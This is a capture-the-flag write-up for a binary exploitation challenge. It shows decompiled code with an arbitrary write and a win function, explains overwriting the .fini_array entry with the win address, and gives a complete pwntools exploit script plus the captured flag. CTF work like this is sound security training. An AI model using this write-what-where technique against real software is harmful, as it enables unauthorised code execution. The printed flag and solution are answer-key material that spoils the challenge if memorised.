# Magic trick

How about a magic trick?
nc dctf-chall-magic-trick.westeurope.azurecontainer.io 7481

## Challenge

We have a single arbitrary write and a win function.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Arbitrary Write

```c
void sym.magic(void)
{
    int64_t in_FS_OFFSET;
    int64_t var_20h;
    int64_t var_18h;
    int64_t var_10h;
    int64_t canary;

    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.puts("What do you want to write");
    sym.imp.__isoc99_scanf("%llu", &var_20h);
    sym.imp.puts("Where do you want to write it");
    sym.imp.__isoc99_scanf("%llu", &var_18h);
    sym.imp.puts("thanks");
    var_10h = var_18h;
    *(int64_t *)var_18h = var_20h;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

### Win Function

```c
void sym.win(void)
{
    int64_t in_FS_OFFSET;
    undefined8 uStack48;
    undefined8 *puStack40;
    undefined8 *puStack32;
    int64_t iStack24;
    code *pcStack16;
    
    pcStack16 = (code *)0x400677;
    sym.imp.puts("You are a real magician");
    pcStack16 = (code *)0x400683;
    sym.imp.system("cat flag.txt");
    pcStack16 = sym.magic;
    sym.imp.exit(1);
}
```

## Solution

Using the arbitrary write, we can overwrite the entry in `.fini_array` so that the program jumps to a specified address when it returns.
By overwriting this value with the address of the `win` function, the program will call this function and read us the flag.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf-chall-magic-trick.westeurope.azurecontainer.io --port 7481 magic_trick
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('magic_trick')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf-chall-magic-trick.westeurope.azurecontainer.io'
port = int(args.PORT or 7481)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x00400667
dtors = 0x00600a00

io.sendline(str(win))
io.sendline(str(dtors))

io.interactive()
```

## Flag

`dctf{1_L1k3_M4G1c}`

